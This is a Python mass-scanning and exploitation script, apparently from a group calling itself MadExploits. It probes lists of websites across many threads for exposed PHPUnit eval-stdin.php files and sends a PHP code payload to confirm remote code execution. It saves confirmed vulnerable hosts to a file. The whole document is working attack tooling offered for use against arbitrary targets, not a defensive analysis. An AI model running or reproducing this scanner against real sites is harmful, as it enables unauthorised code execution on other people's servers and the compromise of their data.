#!/usr/bin/python3

import requests as req
from colorama import *
from multiprocessing.dummy import Pool
from os import name, system
from os.path import exists

if name == "nt":
    system("cls")
else:
    system("clear")


def phpunit(value):
    try:
        Vendor = [
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        ]
        # source from https://github.com/MadExploits/UserAgent-random
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko"
        }
        for x in range(0, len(Vendor)):
            r = req.get(f"{value}{Vendor[x]}", headers=headers, timeout=30)
            if r.status_code == 200 and "<html>" != r.text:
                print(Fore.YELLOW +
                      f"[+] {value}{Vendor[x]}=> [{r.status_code}]" + Style.RESET_ALL)
                print(Back.WHITE + Fore.BLACK + "\n[+] TRYING TO EXPLOITING!\n" + Style.RESET_ALL
                      )
                vuln = req.get(
                    f"{value}{Vendor[x]}", headers=headers, timeout=30, data="<?= 'MrMad' ?>")
                if "MrMad" in vuln.text:
                    print(Fore.GREEN +
                          f"[+] {value}{Vendor[x]} => VULN" + Style.RESET_ALL)
                    with open("vuln.txt", "a") as wr:
                        wr.write(f"{value}{Vendor[x]}" + "\n")
            elif r.status_code == 403:
                print(Fore.RED +
                      f"[+] {value}{Vendor[x]} => [{r.status_code}]" + Style.RESET_ALL)
            elif r.status_code == 500:
                print(Fore.RED +
                      f"[+] {value}{Vendor[x]} => [{r.status_code}]" + Style.RESET_ALL)
    except:
        pass


def main():
    print(Fore.GREEN + f"""
    +--------------[ PHPunit Checker ]------------+
    + Github    : github.com/MadExploits          +
    + Telegram  : t.me/@MadShells                 +
    +                                             +
    +           ~ G0 T0 Fuck1ng Hell! ~           +
    +---------------------------------------------+
    """ + Style.RESET_ALL)

    choosen = input("[!] Scan URL or List of URLs? [1/2]: ")
    if choosen == "1":
        URL = input("URL : ")
        domain = [
            '{}'.format(URL)
        ]
        with Pool(int(120)) as Th:
            Th.map(phpunit, domain)
            Th.close()
            Th.join()
    elif choosen == "2":
        LISTS = input("LIST : ")
        if exists(LISTS):
            with open(LISTS, "r") as re:
                read = re.read()
                splt = read.split("\n")
                with Pool(int(120)) as Th:
                    Th.map(phpunit, splt)
                    Th.close()
                    Th.join()
        else:
            print(Fore.RED + "[!] File Not Found!")
    else:
        print(Fore.RED + "[!] Please choice the number beetwen 1/2!")


if __name__ == "__main__":
    main()
